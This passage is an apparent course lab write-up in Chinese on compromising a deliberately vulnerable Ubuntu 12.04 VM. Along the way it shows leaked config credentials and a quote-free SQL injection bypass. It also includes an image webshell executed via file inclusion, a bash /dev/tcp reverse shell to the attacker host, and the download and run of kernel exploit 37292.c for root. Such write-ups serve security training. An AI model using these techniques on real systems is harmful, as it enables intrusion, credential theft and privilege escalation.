<p>GET 一直没有反应（不应该🤔，以及为什么是 GET），考虑到一般接发文件都使用 POST，改成 POST 试试：</p>
<p><img alt="image-20251021114536140" src="../images/image-20251021114536140.png"/></p>
<p>（挺震撼的）</p>
<p>发现通过 <code>test.php</code> 的远程文件下载可以远程下载大多数文件（需要 root 读权限的不行），不如从 phpMyAdmin 入手获取内容</p>
<p>这里放一段 STFW 的内容：</p>
<blockquote>
<p>phpMyAdmin 的配置文件 <em>config.inc.php</em> 是用于设置数据库连接、安全选项和界面功能的核心文件</p>
<p>在不同操作系统中，<em>config.inc.php</em> 文件的位置可能有所不同：</p>
<ul>
<li><strong>Linux/Unix/macOS</strong>: <em>/etc/phpmyadmin/config.inc.php</em></li>
</ul>
</blockquote>
<p>发现 File not found，遂询问 AI，AI 给了解答</p>
<blockquote>
<p><strong>3. 在 Web 服务器的文档根目录内 (通用情况)</strong></p>
<p>当你<strong>手动下载</strong> phpMyAdmin 的压缩包并解压到你的 Web 目录（如 <code>/var/www/html</code>）时，配置文件就在 phpMyAdmin 的根目录里。</p>
<ul>
<li><code>[你的Web根目录]/phpmyadmin/config.inc.php</code></li>
<li>例如：<ul>
<li><code>/var/www/html/phpmyadmin/config.inc.php</code></li>
<li>...</li>
</ul>
</li>
</ul>
</blockquote>
<p>尝试了若干个可能的文件位置，最终在 <code>/var/www/phpmy/config.inc.php</code> 成功下载了文件</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="cp">&lt;?php</span>

<span class="cm">/* Servers configuration */</span>
<span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

<span class="cm">/* Server: localhost [1] */</span>
<span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'Servers'</span><span class="p">][</span><span class="nv">$i</span><span class="p">][</span><span class="s1">'verbose'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'localhost'</span><span class="p">;</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'Servers'</span><span class="p">][</span><span class="nv">$i</span><span class="p">][</span><span class="s1">'host'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'localhost'</span><span class="p">;</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'Servers'</span><span class="p">][</span><span class="nv">$i</span><span class="p">][</span><span class="s1">'port'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'Servers'</span><span class="p">][</span><span class="nv">$i</span><span class="p">][</span><span class="s1">'socket'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'Servers'</span><span class="p">][</span><span class="nv">$i</span><span class="p">][</span><span class="s1">'connect_type'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'tcp'</span><span class="p">;</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'Servers'</span><span class="p">][</span><span class="nv">$i</span><span class="p">][</span><span class="s1">'extension'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'mysqli'</span><span class="p">;</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'Servers'</span><span class="p">][</span><span class="nv">$i</span><span class="p">][</span><span class="s1">'auth_type'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'cookie'</span><span class="p">;</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'Servers'</span><span class="p">][</span><span class="nv">$i</span><span class="p">][</span><span class="s1">'user'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'root'</span><span class="p">;</span>           <span class="c1">// 账号</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'Servers'</span><span class="p">][</span><span class="nv">$i</span><span class="p">][</span><span class="s1">'password'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'roottoor'</span><span class="p">;</span>   <span class="c1">// 密码</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'Servers'</span><span class="p">][</span><span class="nv">$i</span><span class="p">][</span><span class="s1">'AllowNoPassword'</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>

<span class="cm">/* End of servers configuration */</span>

<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'DefaultLang'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'en-utf-8'</span><span class="p">;</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'ServerDefault'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'UploadDir'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'SaveDir'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>


<span class="cm">/* rajk - for blobstreaming */</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'Servers'</span><span class="p">][</span><span class="nv">$i</span><span class="p">][</span><span class="s1">'bs_garbage_threshold'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">50</span><span class="p">;</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'Servers'</span><span class="p">][</span><span class="nv">$i</span><span class="p">][</span><span class="s1">'bs_repository_threshold'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'32M'</span><span class="p">;</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'Servers'</span><span class="p">][</span><span class="nv">$i</span><span class="p">][</span><span class="s1">'bs_temp_blob_timeout'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">600</span><span class="p">;</span>
<span class="nv">$cfg</span><span class="p">[</span><span class="s1">'Servers'</span><span class="p">][</span><span class="nv">$i</span><span class="p">][</span><span class="s1">'bs_temp_log_threshold'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'32M'</span><span class="p">;</span>


<span class="cp">?&gt;</span>
</code></pre></div></td></tr></table></div>
<p>在 phpMyAdmin 上登录失败，考虑到还开放了 SSH 服务，于是在 SSH 上尝试：</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt; ssh root@10.0.2.5
root@10.0.2.5's password: 
Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-32-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Tue Oct 21 17:43:30 IST 2025

  System load:  0.0               Processes:           78
  Usage of /:   12.1% of 9.61GB   Users logged in:     0
  Memory usage: 10%               IP address for eth0: 10.0.2.5
  Swap usage:   0%

// 省略一些输出

root@indishell:~# 
</code></pre></div></td></tr></table></div>
<p><strong>很神奇地获取了 root 权限</strong>，出于对 phpMyAdmin 的管理员账户的好奇，获取一下账密</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span></pre></div></td><td class="code"><div><pre><span></span><code>root@indishell:~#<span class="w"> </span>cat<span class="w"> </span>/etc/mysql/debian.cnf
<span class="c1"># Automatically generated for Debian scripts. DO NOT TOUCH!</span>
<span class="o">[</span>client<span class="o">]</span>
<span class="nv">host</span><span class="w">     </span><span class="o">=</span><span class="w"> </span>localhost
<span class="nv">user</span><span class="w">     </span><span class="o">=</span><span class="w"> </span>debian-sys-maint
<span class="nv">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Ypo4adDVx2Bzel79
<span class="nv">socket</span><span class="w">   </span><span class="o">=</span><span class="w"> </span>/var/run/mysqld/mysqld.sock
<span class="o">[</span>mysql_upgrade<span class="o">]</span>
<span class="nv">host</span><span class="w">     </span><span class="o">=</span><span class="w"> </span>localhost
<span class="nv">user</span><span class="w">     </span><span class="o">=</span><span class="w"> </span>debian-sys-maint
<span class="nv">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Ypo4adDVx2Bzel79
<span class="nv">socket</span><span class="w">   </span><span class="o">=</span><span class="w"> </span>/var/run/mysqld/mysqld.sock
<span class="nv">basedir</span><span class="w">  </span><span class="o">=</span><span class="w"> </span>/usr
</code></pre></div></td></tr></table></div>
<p>以管理员身份进入了 phpMyAdmin：</p>
<p><img alt="image-20251021122336065" src="../images/image-20251021122336065.png"/></p>
<p>（权限似乎有点混乱，个人认为 <code>root-roottoor</code> 账密应该用于 php 后台登录，而不是 ssh 登录）</p>
<h5 id="indexphp">/index.php 根页面</h5>
<p>最常用的万能密码不能使用，而这里又有 SQL 注入的暗示，考虑是屏蔽了一些 SQL 语句符号，比如单引号 <code>'</code> </p>
<p>在之前的操作中已经得到了远程文件下载的能力，不妨审计 <code>index.php</code> 的代码：</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="x">// 只保留了关键的部分</span>
<span class="x">if(isset($_POST['login']))</span>
<span class="x">{       </span>
<span class="x">        // 把输入中的单引号删掉了，唯一的防御点</span>
<span class="x">        $uname=str_replace('\'','',urldecode($_POST['un']));</span>
<span class="x">        $pass=str_replace('\'','',urldecode($_POST['ps']));</span>
<span class="x">        $run='select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';</span>
<span class="x">        $result = mysqli_query($conn, $run);</span>
<span class="x">if (mysqli_num_rows($result) &gt; 0) {</span>

<span class="x">$row = mysqli_fetch_assoc($result);</span>
<span class="x">           echo "You are allowed&lt;br&gt;";</span>
<span class="x">           $_SESSION['logged']=true;</span>
<span class="x">           $_SESSION['admin']=$row['username'];</span>

<span class="x">         header('Location: panel.php', true, 302);</span>

<span class="x">}</span>
<span class="x">else</span>
<span class="x">{</span>
<span class="x">        echo "&lt;script&gt;alert('Try again');&lt;/script&gt;";</span>
<span class="x">}</span>

<span class="x">}</span>
</code></pre></div></td></tr></table></div>
<p>发现确实会删除输入中的单引号，STFW 找到一个不使用单引号的 payload <code>or 1=1 #" / =\</code></p>
<p>账号密码都输入以上 payload 后成功登录 panel：</p>
<blockquote>
<p>后来发现在远程文件下载时，可以下载 <code>c.php</code>，内容中包含了一个低权限的 phpMyAdmin 的账密，登录后可以查看 panel 页面的账密，就不需要 SQL 注入了</p>
</blockquote>
<p><img alt="image-20251021132151591" src="../images/image-20251021132151591.png"/></p>
<p><img alt="image-20251021132253248" src="../images/image-20251021132253248.png"/></p>
<p>发现 Add User 界面使用的是 /add 页面的框架，依旧是上传一句话木马 <code>shell.php</code> ，抓包改 <code>Content-Type: application/x-php</code> 为 <code>Content-Type: image/png</code>，结果是：</p>
<blockquote>
<p>only png,jpg and gif file are allowed</p>
</blockquote>
<p>考虑伪装文件头，将一张随手截屏的 png 图片和 php 代码拼接，以 <code>.png</code> 格式上传成功（似乎会硬检查后缀名，改 request 也无效）</p>
<p><img alt="image-20251021141244303" src="../images/image-20251021141244303.png"/> </p>
<p>再次打开 Add User 界面时一定会读取刚刚上传的照片，抓一下包：</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span></pre></div></td><td class="code"><div><pre><span></span><code>POST /panel.php HTTP/1.1
Host: 10.0.2.5
Content-Length: 27
Cache-Control: max-age=0
Accept-Language: zh-CN,zh;q=0.9
Origin: http://10.0.2.5
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.0.2.5/panel.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=hjsm15j6iifqf6i150hp28nim6
Connection: keep-alive

load=show&amp;continue=continue

// 以及 response 中被上传的图片的位置
// &lt;img src="uploaded_images/shell.png" height=90px width=100px&gt;
</code></pre></div></td></tr></table></div>
<p>我们修改 <code>load=show</code> 为 <code>load=uploaded_images/shell.png</code>，然后经典的 <code>?cmd=ls</code> 试一试</p>
<blockquote>
<p>在这一步卡了一个多小时，主要是理解 load 参数的使用（利用之前的远程文件读取翻 panel.php 才能理解这个参数），以及尝试直接在 panel.php 携带参数。另外一开始我一直尝试上传 .php 后缀的文件发现查的很严（白名单限制），在上传 .png 文件的时候也不确定可以执行 php 部分</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="x">if(isset($_POST['continue']))</span>
<span class="x">{</span>
<span class="x">  $dir=getcwd();</span>
<span class="x">  $choice=str_replace('./','',$_POST['load']);</span>
<span class="x">  </span>
<span class="x">  if($choice==='add')</span>
<span class="x">  {</span>
<span class="x">              include($dir.'/'.$choice.'.php');</span>
<span class="x">          die();</span>
<span class="x">  }</span>
<span class="x">  </span>
<span class="x">        if($choice==='show')</span>
<span class="x">  {</span>
<span class="x">        </span>
<span class="x">      include($dir.'/'.$choice.'.php');</span>
<span class="x">      die();</span>
<span class="x">  }</span>
<span class="x">  else</span>
<span class="x">  {</span>
<span class="x">      include($dir.'/'.$_POST['load']);   // 这里有执行一句话木马的条件</span>
<span class="x">  }</span>
<span class="x">  </span>
<span class="x">}</span>
</code></pre></div></td></tr></table></div>
</blockquote>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span></pre></div></td><td class="code"><div><pre><span></span><code>POST /panel.php?cmd=ls HTTP/1.1
Host: 10.0.2.5
Content-Length: 49
Cache-Control: max-age=0
Accept-Language: zh-CN,zh;q=0.9
Origin: http://10.0.2.5
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.0.2.5/panel.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=hjsm15j6iifqf6i150hp28nim6
Connection: keep-alive

// 这里是我换了个图片马，所以名字不一样
load=uploaded_images/shell2.jpg&amp;continue=continue
</code></pre></div></td></tr></table></div>
<p>发现 response 中真的执行了 <code>ls</code> 指令，于是我们可以 Getshell，把 cmd 参数设置为 <code>cmd=bash+-c+"bash+-i+&gt;%26+/dev/tcp/10.0.2.3/1234+0&gt;%261"</code> （获取反向 Shell 的指令进行 URL 编码）</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span>
<span class="normal">4</span>
<span class="normal">5</span>
<span class="normal">6</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt;<span class="w"> </span>nc<span class="w"> </span>-lvp<span class="w"> </span><span class="m">1234</span><span class="w"> </span>
listening<span class="w"> </span>on<span class="w"> </span><span class="o">[</span>any<span class="o">]</span><span class="w"> </span><span class="m">1234</span><span class="w"> </span>...
<span class="m">10</span>.0.2.5:<span class="w"> </span>inverse<span class="w"> </span>host<span class="w"> </span>lookup<span class="w"> </span>failed:<span class="w"> </span>Unknown<span class="w"> </span>host
connect<span class="w"> </span>to<span class="w"> </span><span class="o">[</span><span class="m">10</span>.0.2.3<span class="o">]</span><span class="w"> </span>from<span class="w"> </span><span class="o">(</span>UNKNOWN<span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="m">10</span>.0.2.5<span class="o">]</span><span class="w"> </span><span class="m">45714</span>
bash:<span class="w"> </span>no<span class="w"> </span>job<span class="w"> </span>control<span class="w"> </span><span class="k">in</span><span class="w"> </span>this<span class="w"> </span>shell
www-data@indishell:/var/www$
</code></pre></div></td></tr></table></div>
<p>成功获得了 www-data 低权限用户，这里我考虑换一种提权方式：内核提权</p>
<blockquote>
<p>其实 phpinfo 页面已经有了这些信息，我忘记了</p>
</blockquote>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span></pre></div></td><td class="code"><div><pre><span></span><code>www-data@indishell:$ lsb_release -a
lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 12.04.5 LTS
Release:        12.04
Codename:       precise

www-data@indishell:/var$ uname -a
uname -a
Linux indishell 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux
</code></pre></div></td></tr></table></div>
<p>获取版本为 Ubuntu 12.04.5 LTS，内核为 Linux 3.13.0，<code>searchsploit</code> 搜一下：</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt; searchsploit Ubuntu 12.04.5        ✔  23:55:11   
-------------------------------- ---------------------------------
 Exploit Title                  |  Path
-------------------------------- ---------------------------------
Ubuntu &lt; 15.10 - PT Chown Arbit | linux/local/41760.txt
-------------------------------- ---------------------------------
Shellcodes: No Results

&gt; searchsploit Linux 3.13.0 
---------------------------------------------------- ---------------------------------
 Exploit Title                                      |  Path
---------------------------------------------------- ---------------------------------
// 删掉了一些不太相关的搜索结果
Linux Kernel (Solaris 10 / &lt; 5.10 138888-01) - Loca | solaris/local/15962.c
Linux Kernel 2.6.19 &lt; 5.9 - 'Netfilter Local Privil | linux/local/50135.c
Linux Kernel 3.11 &lt; 4.8 0 - 'SO_SNDBUFFORCE' / 'SO_ | linux/local/41995.c
Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.1 | linux/local/37292.c           // choose this
Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.1 | linux/local/37293.txt
Linux Kernel 3.14-rc1 &lt; 3.15-rc4 (x64) - Raw Mode P | linux_x86-64/local/33516.c
Linux Kernel 3.4 &lt; 3.13.2 (Ubuntu 13.04/13.10 x64)  | linux_x86-64/local/31347.c
Linux Kernel 3.4 &lt; 3.13.2 (Ubuntu 13.10) - 'CONFIG_ | linux/local/31346.c
Linux Kernel 3.4 &lt; 3.13.2 - recvmmsg x32 compat (Po | linux/dos/31305.c
---------------------------------------------------- ---------------------------------
Shellcodes: No Results
</code></pre></div></td></tr></table></div>
<p>攻击机上 http 上传一份代码，靶机上接收编译运行：</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span></pre></div></td><td class="code"><div><pre><span></span><code>www-data@indishell:/$ cd /tmp
cd /tmp
www-data@indishell:/tmp$ wget 10.0.2.3:1145/37292.c
wget 10.0.2.3:1145/37292.c
--2025-10-21 21:40:10--  http://10.0.2.3:1145/37292.c
Connecting to 10.0.2.3:1145... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4968 (4.9K) [text/x-csrc]
Saving to: `37292.c'

     0K ....                                                  100%  288M=0s

2025-10-21 21:40:10 (288 MB/s) - `37292.c' saved [4968/4968]

www-data@indishell:/tmp$ gcc 37292.c -o exploit
gcc 37292.c -o exploit

www-data@indishell:/tmp$ ./exploit
./exploit
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 0: can't access tty; job control turned off
# whoami
root
</code></pre></div></td></tr></table></div>
<p>获得了 root 权限</p>
<blockquote>
<p>后记：在 Getshell 后可以用老师上课时推荐使用的 linpeas 进行信息搜集，可以直接找到 root 账密</p>
</blockquote>
<h3 id="2-ssh">尝试方向 2: SSH</h3>
<p>有一个 SSH 页面，在方向 1 获取 root 密码为 <code>roottoor</code> 时，意识到这是一个弱密码，因此可以尝试直接用 Hydra 进行爆破：</p>
<p>（可以在尝试方向 1 的时候，单独开一个窗口跑 Hydra）</p>
<p>实测发现平均每分钟可以处理 200 组密码（账号 root），如果用 <code>rockyou.txt</code> 可能要爆破一晚上，并且之后发现 <code>roottoor</code> 这个密码甚至不在 <code>rockyou.txt</code> 的庞大数据集中</p>
<p>所以爆破成功的可能性很低</p>
<hr/>
<h2 id="_4">渗透结果</h2>
<p>成功获取了 root 权限并且修改了 root 密码，登录靶机界面，输入新密码进入 root 账号：</p>
<p><img alt="image-20251021121744187" src="../images/image-20251021121744187.png"/></p>
<p>另外获得 root 权限后可以搜索获得 phpMyAdmin 的管理员账号搜集信息</p>
<hr/>
<h2 id="_5">渗透全过程图示</h2>
<p>用 mermaid 绘制了一幅全过程清单</p>
<pre class="mermaid"><code>flowchart TD
O[nmap 扫描存活主机与端口] --&gt; A[dirb 目录爆破]
O[nmap 扫描存活主机与端口] --&gt; U[SSH 爆破（希望渺茫）]
A[dirb 目录爆破] --&gt; test(/test 子页面)
A[dirb 目录爆破] --&gt; index(/index 登录页面)
A[dirb 目录爆破] --&gt; in(phpinfo 子页面)
index(/index 登录页面) --&gt;|SQL 注入| G[登录 panel.php]
test(/test 子页面) --&gt;|任意文件下载| Z[盲搜获得 phpMyAdmin 配置文件]
Z --&gt;|登录 SSH| C[获得 root 账号]
test(/test 子页面) --&gt;|任意文件下载| D[获得 c.php 源代码]
test(/test 子页面) --&gt;|任意文件下载| H[获得 index.php 源代码]
test(/test 子页面) --&gt;|任意文件下载| J[获得 panel.php 源代码]
H[获得 index.php 源代码] --&gt;|发现 SQL 注入点| index(/index 登录页面)
D[获得 c.php 源代码] --&gt;|获得 phpMyAdmin 低权限账号| E[登录 phpMyAdmin]
E[登录 phpMyAdmin] --&gt; F[获取 index 页面账密]
F[获取 index 页面账密] --&gt; G[登录 panel.php]
G[登录 panel.php] --&gt;|Add User 图片马上传| I[Getshell]
J[获得 panel.php 源代码] --&gt;|分析图片马利用方法| I[Getshell]
I[Getshell] --&gt; |上传 linpeas 获取信息|B[在 phpMyAdmin 配置文件扫描到 root 密码]
B --&gt;|登录 SSH| C[获得 root 权限]
in(phpinfo 子页面) --&gt; Q[获取靶机内核版本]
I[Getshell] --&gt; P[搜索内核漏洞]
Q[获取靶机内核版本] --&gt;|提供内核版本信息| P[搜索内核漏洞]
P[搜索内核漏洞] --&gt; R[http 下载，编译运行]
R[http 下载，编译运行] --&gt; C[获得 root 权限]
</code></pre>
<p><del>一切尽在不言中。</del></p>
<hr/>
<h2 id="_6">其他</h2>
<p>用时约 6h，其中第一次得到 root 账号用时 2h</p>
</article>
</div>
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
</div>
</main>
<footer class="md-footer">
<div class="md-footer-meta md-typeset">
<div class="md-footer-meta__inner md-grid">
<div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" rel="noopener" target="_blank">
      Material for MkDocs
    </a>
</div>
</div>
</div>
</footer>
</div>
<div class="md-dialog" data-md-component="dialog">
<div class="md-dialog__inner md-typeset"></div>
</div>
<script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.copy"], "search": "../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
<script src="../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
<script src="../../../stylesheets/extra.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.9/katex.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
<script type="module">import mermaid from "https://unpkg.com/mermaid@10.4.0/dist/mermaid.esm.min.mjs";
window.mermaidConfig = {default: {
    startOnLoad: false
}};</script></body>
</html>